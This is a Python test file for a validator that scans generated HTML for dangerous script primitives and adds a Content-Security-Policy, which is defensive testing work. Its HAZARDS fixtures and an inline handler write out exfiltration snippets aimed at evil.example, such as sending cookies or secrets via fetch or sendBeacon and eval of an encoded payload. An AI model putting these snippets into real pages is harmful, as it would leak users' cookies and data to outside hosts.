"""The validator has to read what the model actually generated.

`preview_html` is rendered by the frontend, so structural checks (line count,
external assets, missing tags) never proved the script was safe. These tests
pin both halves of the fix: the content scan reports every dangerous primitive,
and — just as important — the real demo-kit artifacts still come back clean, so
a deny-list can never quietly break the product.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from app.agents.workers.code_validator import (
    harden_artifact,
    harden_html,
    scan_script_hazards,
    validate_html,
)

ARTIFACTS = sorted((Path(__file__).resolve().parent.parent / "app" / "demo_kits" / "artifacts").glob("*.html"))


def _page(body: str = "", head: str = "", script: str = "") -> str:
    return (
        "<!doctype html>\n<html>\n<head>\n"
        '<meta charset="utf-8">\n'
        '<meta name="viewport" content="width=device-width,initial-scale=1">\n'
        f"{head}\n</head>\n<body>\n{body}\n"
        f"<script>\n{script}\n</script>\n</body>\n</html>\n"
    )


def _security(html: str) -> list[str]:
    return [v for v in validate_html(html) if v.startswith("security:")]


# ── No false positives on the real artifacts ───────────────────────────────


def test_demo_artifacts_exist():
    assert len(ARTIFACTS) == 4


@pytest.mark.parametrize("path", ARTIFACTS, ids=lambda p: p.name)
def test_real_demo_artifacts_still_validate_clean(path):
    """A false positive here breaks the product — it matters as much as a miss."""
    assert validate_html(path.read_text(encoding="utf-8")) == []


@pytest.mark.parametrize("path", ARTIFACTS, ids=lambda p: p.name)
def test_real_demo_artifacts_survive_hardening(path):
    raw = path.read_text(encoding="utf-8")
    hardened = harden_html(raw)
    assert validate_html(hardened) == []
    assert hardened.index("Content-Security-Policy") < hardened.lower().index("<script")
    # Nothing but the policy meta was touched.
    start = hardened.index("<meta http-equiv=")
    end = hardened.index("-->", start) + 3
    assert hardened[:start] + hardened[end:] == raw


def test_localstorage_alone_is_not_a_hazard():
    """All four kits persist to localStorage; the sandbox denies it same-origin
    storage anyway. Flagging it would be pure noise."""
    html = _page(script="try { localStorage.setItem('orizon.calc.v1', JSON.stringify(state)); } catch (e) {}")
    assert _security(html) == []


def test_prose_and_code_samples_are_not_scanned():
    """Only executable regions are scanned, so a page that *talks about* these
    primitives — docs, a landing page, a snippet viewer — still ships."""
    html = _page(
        body="<p>We never call fetch() or eval() in this app.</p>"
        "<pre><code>const r = await fetch('/api'); new Function('x')();</code></pre>",
        script="const total = a + b;",
    )
    assert _security(html) == []


# ── Every dangerous primitive is reported ──────────────────────────────────

HAZARDS = [
    ("fetch", "fetch('https://evil.example/?d=' + secret);"),
    ("xhr", "const x = new XMLHttpRequest(); x.open('POST', 'https://evil.example');"),
    ("beacon", "navigator.sendBeacon('https://evil.example', data);"),
    ("websocket", "const ws = new WebSocket('wss://evil.example');"),
    ("eventsource", "const es = new EventSource('https://evil.example/stream');"),
    ("dynamic_import", "import('https://evil.example/payload.js');"),
    ("nav", "window.location.href = 'https://evil.example/?d=' + data;"),
    ("nav_replace", "location.replace('https://evil.example/?d=' + data);"),
    ("eval", "eval(atob(payload));"),
    ("new_function", "new Function('return ' + payload)();"),
    ("timer_string", "setTimeout('doEvil()', 100);"),
    ("parent", "window.parent.postMessage(document.body.innerHTML, '*');"),
    ("top", "window.top.location = 'https://evil.example';"),
    ("cookie", "const c = document.cookie;"),
]


@pytest.mark.parametrize("name,snippet", HAZARDS, ids=[h[0] for h in HAZARDS])
def test_dangerous_primitive_in_script_is_reported(name, snippet):
    hits = _security(_page(script=snippet))
    assert hits, f"{name} went unreported"
    assert all(v.startswith("security: ") for v in hits)


def test_hazard_in_inline_event_handler_is_reported():
    html = _page(body="<button onclick=\"fetch('https://evil.example/?c='+document.cookie)\">go</button>")
    assert len(_security(html)) >= 2


def test_hazard_in_javascript_url_is_reported():
    html = _page(body='<a href="javascript:eval(window.name)">click</a>')
    assert _security(html)


def test_scan_handles_markup_without_script():
    assert scan_script_hazards("<html><body><p>hi</p></body></html>") == []
    assert scan_script_hazards("") == []


# ── Hazards downgrade the artifact, they never discard it ──────────────────


def test_hazardous_artifact_is_reported_but_still_delivered():
    """Design decision, pinned: report + contain, never reject. The user paid
    for this run; dropping the deliverable on a heuristic is the worse failure."""
    html = _page(script="fetch('https://evil.example/?d=' + localStorage.getItem('k'));")
    artifact = harden_artifact(
        {
            "title": "t",
            "summary": "s",
            "entry": "index.html",
            "files": [{"path": "index.html", "language": "html", "content": html}],
            "preview_html": html,
        }
    )
    assert _security(html)  # reported …
    assert artifact["preview_html"]  # … and still shipped …
    # … but the policy travels with it: no egress destination survives.
    assert "connect-src 'none'" in artifact["preview_html"]
    assert "form-action 'none'" in artifact["preview_html"]
    assert "default-src 'none'" in artifact["preview_html"]


def test_harden_artifact_covers_preview_and_downloadable_files():
    html = _page(script="const x = 1;")
    artifact = harden_artifact(
        {
            "entry": "index.html",
            "files": [
                {"path": "index.html", "language": "html", "content": html},
                {"path": "notes.md", "language": "md", "content": "# notes"},
            ],
            "preview_html": html,
        }
    )
    assert "Content-Security-Policy" in artifact["preview_html"]
    assert "Content-Security-Policy" in artifact["files"][0]["content"]
    # Non-HTML payloads are left exactly as they were.
    assert artifact["files"][1]["content"] == "# notes"


def test_harden_is_idempotent():
    once = harden_html(_page(script="const x = 1;"))
    assert harden_html(once) == once
    assert once.count("Content-Security-Policy") == 1


def test_harden_inserts_before_a_script_that_precedes_head():
    html = "<script>steal()</script><html><head></head><body></body></html>"
    hardened = harden_html(html)
    assert hardened.index("Content-Security-Policy") < hardened.index("steal()")


def test_harden_handles_a_fragment_without_html_or_head():
    hardened = harden_html("<div>hi</div>")
    assert hardened.startswith("<meta http-equiv=")
    assert hardened.endswith("<div>hi</div>")


def test_harden_leaves_empty_input_alone():
    assert harden_html("") == ""
    assert harden_html("   ") == "   "
